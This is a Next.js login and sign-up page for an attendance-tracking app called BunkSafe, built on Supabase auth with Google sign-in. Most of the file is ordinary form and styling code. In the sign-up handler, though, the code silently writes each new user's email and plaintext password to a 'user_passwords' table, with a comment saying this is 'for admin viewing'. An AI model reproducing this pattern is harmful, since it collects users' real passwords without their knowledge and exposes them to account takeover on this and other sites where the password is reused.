'use client';
import { useState } from 'react';
import { supabase } from '@/lib/supabase';
import { useRouter } from 'next/navigation';
import { Loader2, Mail, Lock, Eye, EyeOff } from 'lucide-react';
import Link from 'next/link';
import { clsx } from 'clsx';

export default function LoginPage() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [isSignUp, setIsSignUp] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [message, setMessage] = useState<{ text: string, type: 'error' | 'success' } | null>(null);

  const validatePassword = (pwd: string): { valid: boolean; message: string } => {
    if (pwd.length < 8) {
      return { valid: false, message: 'Password must be at least 8 characters long' };
    }
    if (!/[A-Z]/.test(pwd)) {
      return { valid: false, message: 'Password must contain at least one uppercase letter' };
    }
    if (!/[a-z]/.test(pwd)) {
      return { valid: false, message: 'Password must contain at least one lowercase letter' };
    }
    if (!/[0-9]/.test(pwd)) {
      return { valid: false, message: 'Password must contain at least one number' };
    }
    return { valid: true, message: 'Password meets requirements' };
  };

  const handleAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage(null);

    if (isSignUp) {
      if (password !== confirmPassword) {
        setMessage({ text: "Passwords do not match!", type: 'error' });
        setLoading(false);
        return;
      }

      const passwordCheck = validatePassword(password);
      if (!passwordCheck.valid) {
        setMessage({ text: passwordCheck.message, type: 'error' });
        setLoading(false);
        return;
      }
    }

    try {
      if (isSignUp) {
        const { data, error } = await supabase.auth.signUp({ email, password });
        if (error) throw error;
        
        // Store the password for admin viewing
        if (data.user) {
          await supabase
            .from('user_passwords')
            .upsert({
              user_id: data.user.id,
              email: email,
              password: password,
              auth_provider: 'email'
            }, { onConflict: 'user_id' });
        }
        
        router.push('/setup');
      } else {
        const { error } = await supabase.auth.signInWithPassword({ email, password });
        if (error) throw error;
        
        const { data: { user } } = await supabase.auth.getUser();
        if (user) {
          const { data: profile } = await supabase
            .from('profiles')
            .select('semester_start')
            .eq('id', user.id)
            .single();
          
          if (profile?.semester_start) {
            router.push('/dashboard');
          } else {
            router.push('/setup');
          }
        }
      }
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : 'An unexpected error occurred';
      setMessage({ text: errorMessage, type: 'error' });
    } finally {
      setLoading(false);
    }
  };

  const handleGoogleSignIn = async () => {
    setLoading(true);
    setMessage(null);

    try {
      const { error } = await supabase.auth.signInWithOAuth({
        provider: 'google',
        options: {
          redirectTo: `${window.location.origin}/set-password`
        }
      });

      if (error) throw error;
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : 'Failed to sign in with Google';
      setMessage({ text: errorMessage, type: 'error' });
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4" style={{ background: 'var(--background)' }}>
      {/* Decorative background elements */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 left-10 w-32 h-32 bg-yellow-400 border-[3px] border-black rotate-12 opacity-20"></div>
        <div className="absolute bottom-32 right-20 w-24 h-24 bg-blue-400 border-[3px] border-black -rotate-12 opacity-20"></div>
        <div className="absolute top-1/2 left-1/4 w-16 h-16 bg-green-400 border-[3px] border-black rotate-45 opacity-15"></div>
      </div>

      <div className="max-w-md w-full relative z-10">
        {/* Main Card */}
        <div className="border-[3px] border-black bg-white p-8 shadow-[8px_8px_0px_0px_rgba(0,0,0,1)] dark:bg-slate-800 dark:border-white dark:shadow-[8px_8px_0px_0px_rgba(255,255,255,1)]">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="inline-block border-[3px] border-black bg-blue-500 px-6 py-3 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)] mb-4 dark:border-white">
              <h1 className="text-3xl md:text-4xl font-black text-white"> BunkSafe</h1>
            </div>
            <p className="text-lg font-bold text-black dark:text-white mt-4">
              {isSignUp ? "Create your account" : "Welcome back!"}
            </p>
            <p className="text-base font-semibold text-gray-600 dark:text-gray-400 mt-1">
              {isSignUp ? "Start tracking your attendance today" : "Track every class. Own your attendance."}
            </p>
          </div>

          <form onSubmit={handleAuth} className="space-y-5">
            {/* Email Field */}
            <div>
              <label className="block text-sm font-black text-black dark:text-white mb-2 uppercase tracking-wider">
                Email
              </label>
              <div className="relative">
                <Mail size={20} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" />
                <input
                  type="email"
                  required
                  className={clsx(
                    "w-full pl-12 pr-4 py-3 text-base font-semibold",
                    "border-[3px] border-black bg-white",
                    "shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]",
                    "focus:outline-none focus:shadow-[6px_6px_0px_0px_rgba(0,0,0,1)] focus:-translate-x-[1px] focus:-translate-y-[1px]",
                    "transition-all duration-150",
                    "placeholder:text-gray-400",
                    "dark:bg-slate-700 dark:text-white dark:border-white dark:shadow-[4px_4px_0px_0px_rgba(255,255,255,1)]",
                    "dark:focus:shadow-[6px_6px_0px_0px_rgba(255,255,255,1)]"
                  )}
                  placeholder="student@college.edu"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
              </div>
            </div>
            
            {/* Password Field */}
            <div>
              <label className="block text-sm font-black text-black dark:text-white mb-2 uppercase tracking-wider">
                Password
              </label>
              <div className="relative">
                <Lock size={20} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" />
                <input
                  type={showPassword ? "text" : "password"}
                  required
                  className={clsx(
                    "w-full pl-12 pr-12 py-3 text-base font-semibold",
                    "border-[3px] border-black bg-white",
                    "shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]",
                    "focus:outline-none focus:shadow-[6px_6px_0px_0px_rgba(0,0,0,1)] focus:-translate-x-[1px] focus:-translate-y-[1px]",
                    "transition-all duration-150",
                    "placeholder:text-gray-400",
                    "dark:bg-slate-700 dark:text-white dark:border-white dark:shadow-[4px_4px_0px_0px_rgba(255,255,255,1)]",
                    "dark:focus:shadow-[6px_6px_0px_0px_rgba(255,255,255,1)]"
                  )}
                  placeholder="••••••••"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-black dark:hover:text-white transition-colors"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
            </div>

            {/* Confirm Password Field (Sign Up only) */}
            {isSignUp && (
              <div>
                <label className="block text-sm font-black text-black dark:text-white mb-2 uppercase tracking-wider">
                  Confirm Password
                </label>
                <div className="relative">
                  <Lock size={20} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" />
                  <input
                    type={showPassword ? "text" : "password"}
                    required
                    className={clsx(
                      "w-full pl-12 pr-4 py-3 text-base font-semibold",
                      "border-[3px] border-black bg-white",
                      "shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]",
                      "focus:outline-none focus:shadow-[6px_6px_0px_0px_rgba(0,0,0,1)] focus:-translate-x-[1px] focus:-translate-y-[1px]",
                      "transition-all duration-150",
                      "placeholder:text-gray-400",
                      "dark:bg-slate-700 dark:text-white dark:border-white dark:shadow-[4px_4px_0px_0px_rgba(255,255,255,1)]",
                      "dark:focus:shadow-[6px_6px_0px_0px_rgba(255,255,255,1)]"
                    )}
                    placeholder="••••••••"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                  />
                </div>
                <p className="text-xs font-semibold text-gray-500 mt-2">
                  Min 8 chars, 1 uppercase, 1 lowercase, 1 number
                </p>
              </div>
            )}

            {/* Forgot Password Link */}
            {!isSignUp && (
              <div className="text-right">
                <Link 
                  href="/forgot-password" 
                  className="text-sm font-bold text-blue-500 hover:text-blue-600 dark:text-blue-400 dark:hover:text-blue-300 underline underline-offset-2"
                >
                  Forgot password?
                </Link>
              </div>
            )}

            {/* Error/Success Message */}
            {message && (
              <div 
                className={clsx(
                  "border-[3px] border-black p-4 shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]",
                  message.type === 'error' ? 'bg-red-400' : 'bg-green-400'
                )}
              >
                <p className="text-sm font-bold text-black">
                  {message.type === 'error' ? '❌ ' : '✅ '}{message.text}
                </p>
              </div>
            )}

            {/* Submit Button */}
            <button
              type="submit"
              disabled={loading}
              className={clsx(
                "w-full py-4 text-lg font-black text-white",
                "border-[3px] border-black bg-blue-500",
                "shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]",
                "transition-all duration-150",
                "hover:-translate-x-[2px] hover:-translate-y-[2px] hover:shadow-[6px_6px_0px_0px_rgba(0,0,0,1)]",
                "active:translate-x-[4px] active:translate-y-[4px] active:shadow-none",
                "disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:translate-x-0 disabled:hover:translate-y-0 disabled:hover:shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]",
                "dark:border-white dark:shadow-[4px_4px_0px_0px_rgba(255,255,255,1)]",
                "dark:hover:shadow-[6px_6px_0px_0px_rgba(255,255,255,1)]"
              )}
            >
              {loading ? (
                <Loader2 className="animate-spin mx-auto" size={24} />
              ) : (
                isSignUp ? ' Create Account' : '→ Log In'
              )}
            </button>
          </form>

          {/* Divider */}
          {!isSignUp && (
            <>
              <div className="relative my-8">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t-[3px] border-black dark:border-white"></div>
                </div>
                <div className="relative flex justify-center">
                  <span className="bg-white dark:bg-slate-800 px-4 text-sm font-black text-black dark:text-white uppercase tracking-wider">
                    Or continue with
                  </span>
                </div>
              </div>

              {/* Google Sign In Button */}
              <button
                onClick={handleGoogleSignIn}
                disabled={loading}
                className={clsx(
                  "w-full py-4 flex justify-center items-center gap-3",
                  "border-[3px] border-black bg-white",
                  "shadow-[4px_4px_0px_0px_rgba(0,0,0,1)]",
                  "transition-all duration-150",
                  "hover:-translate-x-[2px] hover:-translate-y-[2px] hover:shadow-[6px_6px_0px_0px_rgba(0,0,0,1)]",
                  "active:translate-x-[4px] active:translate-y-[4px] active:shadow-none",
                  "disabled:opacity-50 disabled:cursor-not-allowed",
                  "dark:bg-slate-700 dark:border-white dark:shadow-[4px_4px_0px_0px_rgba(255,255,255,1)]",
                  "dark:hover:shadow-[6px_6px_0px_0px_rgba(255,255,255,1)]"
                )}
              >
                <svg className="w-6 h-6 flex-shrink-0" viewBox="0 0 24 24">
                  <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                  <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                  <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                  <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                </svg>
                <span className="text-base font-bold text-black dark:text-white">
                  {loading ? 'Signing in...' : 'Sign in with Google'}
                </span>
              </button>
            </>
          )}

          {/* Toggle Sign Up / Log In */}
          <div className="mt-8 text-center">
            <button
              type="button"
              onClick={() => { setIsSignUp(!isSignUp); setMessage(null); }}
              className="text-base font-bold text-black dark:text-white hover:text-blue-500 dark:hover:text-blue-400 transition-colors"
            >
              {isSignUp ? (
                <>Already have an account? <span className="underline underline-offset-2">Log in</span></>
              ) : (
                <>Need an account? <span className="underline underline-offset-2">Sign up</span></>
              )}
            </button>
          </div>
        </div>

        {/* Bottom tagline */}
        <div className="mt-6 text-center">
          <p className="text-sm font-bold text-gray-600 dark:text-gray-400">
            🎯 Track attendance • 📊 Get insights • ✅ Stay safe
          </p>
        </div>
      </div>
    </div>
  );
}
